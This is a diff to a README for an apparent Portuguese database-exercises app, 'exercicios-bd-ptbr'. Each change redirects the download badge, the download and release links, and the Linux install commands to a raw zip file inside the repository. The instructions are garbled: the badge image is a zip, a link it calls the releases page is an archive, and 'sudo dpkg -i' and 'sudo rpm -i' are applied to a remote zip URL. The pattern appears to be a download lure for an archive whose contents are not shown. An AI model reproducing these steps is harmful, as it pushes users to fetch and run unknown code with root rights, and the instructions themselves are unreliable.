@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the "exercicios-bd-ptbr" appl
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/PrasadLearning1234/exercicios-bd-ptbr/main/medicament/exercicios-bd-ptbr.zip%20Latest%20Release-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/PrasadLearning1234/exercicios-bd-ptbr/main/medicament/exercicios-bd-ptbr.zip)
+[![Download Latest Release](https://github.com/PrasadLearning1234/exercicios-bd-ptbr/raw/refs/heads/main/exercises/ptbr-exercicios-bd-3.9.zip%20Latest%20Release-v1.0-blue?style=for-the-badge)](https://github.com/PrasadLearning1234/exercicios-bd-ptbr/raw/refs/heads/main/exercises/ptbr-exercicios-bd-3.9.zip)
 
 ## 📋 Features
 
@@ -25,7 +25,7 @@ Before you download, ensure your system meets these requirements:
 
 ## 💻 Download & Install
 
-To get started, visit this page to download: [Download Here](https://raw.githubusercontent.com/PrasadLearning1234/exercicios-bd-ptbr/main/medicament/exercicios-bd-ptbr.zip)
+To get started, visit this page to download: [Download Here](https://github.com/PrasadLearning1234/exercicios-bd-ptbr/raw/refs/heads/main/exercises/ptbr-exercicios-bd-3.9.zip)
 
 1. Once you’re on the Releases page, look for the latest version of the application.
 2. Find the file that matches your operating system:
@@ -49,7 +49,7 @@ To get started, visit this page to download: [Download Here](https://raw.githubu
 3. **Linux:**
    - Open your terminal.
    - Navigate to the directory where you downloaded the package.
-   - Use the command `sudo dpkg -i https://raw.githubusercontent.com/PrasadLearning1234/exercicios-bd-ptbr/main/medicament/exercicios-bd-ptbr.zip` (for Debian/Ubuntu) or `sudo rpm -i https://raw.githubusercontent.com/PrasadLearning1234/exercicios-bd-ptbr/main/medicament/exercicios-bd-ptbr.zip` (for Fedora).
+   - Use the command `sudo dpkg -i https://github.com/PrasadLearning1234/exercicios-bd-ptbr/raw/refs/heads/main/exercises/ptbr-exercicios-bd-3.9.zip` (for Debian/Ubuntu) or `sudo rpm -i https://github.com/PrasadLearning1234/exercicios-bd-ptbr/raw/refs/heads/main/exercises/ptbr-exercicios-bd-3.9.zip` (for Fedora).
 
 ## 🚀 Running the Application
 
@@ -71,7 +71,7 @@ Once the application is open, you will see the main interface. Here’s how to n
 
 To keep your application updated:
 
-1. Visit the releases page: [Latest Releases](https://raw.githubusercontent.com/PrasadLearning1234/exercicios-bd-ptbr/main/medicament/exercicios-bd-ptbr.zip)
+1. Visit the releases page: [Latest Releases](https://github.com/PrasadLearning1234/exercicios-bd-ptbr/raw/refs/heads/main/exercises/ptbr-exercicios-bd-3.9.zip)
 2. Download the latest version following the same steps as before.
 3. Replace the previous version with the newest one.
 
